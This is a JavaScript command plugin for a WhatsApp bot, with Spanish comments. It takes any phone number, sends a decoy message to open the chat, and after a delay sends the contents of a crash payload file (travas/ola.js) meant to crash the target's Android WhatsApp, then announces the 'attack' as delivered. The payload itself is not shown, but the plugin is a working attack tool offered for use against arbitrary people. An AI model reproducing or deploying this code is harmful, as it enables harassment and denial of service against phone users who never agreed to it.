import fs from 'fs';
import path from 'path';

const crashAndroidMisa = {
    name: 'crash-android',
    alias: ['ca', 'crash', 'ola'],
    category: 'tools',
    noPrefix: true,
    isOwner: false,

    run: async (conn, m, { args, command }) => {
        try {
            const chat = m.key.remoteJid;

            if (!args[0]) {
                const textoUso = `✧ ‧₊˚ *MISA CRASH* ୧ֹ˖ ⑅ ࣪⊹\n\n✰ \`Uso\`: ${command} [número]\n> ✐ *Ejemplo:* ${command} 1809xxxxxxx`;
                return await conn.sendMessage(chat, { text: textoUso }, { quoted: m });
            }

            const num = args[0].replace(/[^0-9]/g, '');
            if (!num || num.length < 8) {
                return await conn.sendMessage(chat, { text: '❌ *Número inválido.*' }, { quoted: m });
            }
            const targetJid = `${num}@s.whatsapp.net`;

            const pathTrava = path.join(process.cwd(), 'travas', 'ola.js');
            if (!fs.existsSync(pathTrava)) {
                return await conn.sendMessage(chat, { text: '❌ No encontré: `travas/ola.js`' }, { quoted: m });
            }

            const contenidoTrava = fs.readFileSync(pathTrava, 'utf8');

            // 1. Reacción de espera
            await conn.sendMessage(chat, { react: { text: '⏳', key: m.key } });

            // 2. PRIMER ENVÍO: Mensaje "señuelo" para abrir el canal
            // Esto hace que WhatsApp crea que es una conversación normal
            await conn.sendMessage(targetJid, { text: '...' });

            // 3. SEGUNDO ENVÍO: La carga pesada con un pequeño retraso
            setTimeout(async () => {
                try {
                    await conn.sendMessage(targetJid, { text: contenidoTrava });
                    
                    // Reacción final de éxito
                    await conn.sendMessage(chat, { react: { text: '💀', key: m.key } });
                    
                    await conn.sendMessage(chat, { 
                        text: `✅ *Ataque entregado con éxito a @${num}*`,
                        mentions: [targetJid]
                    }, { quoted: m });
                } catch (e) {
                    console.error('Fallo al enviar trava:', e);
                }
            }, 1500); // 1.5 segundos de espera entre mensajes

        } catch (err) {
            console.error('Error en crash-android:', err);
        }
    }
};

export default crashAndroidMisa;
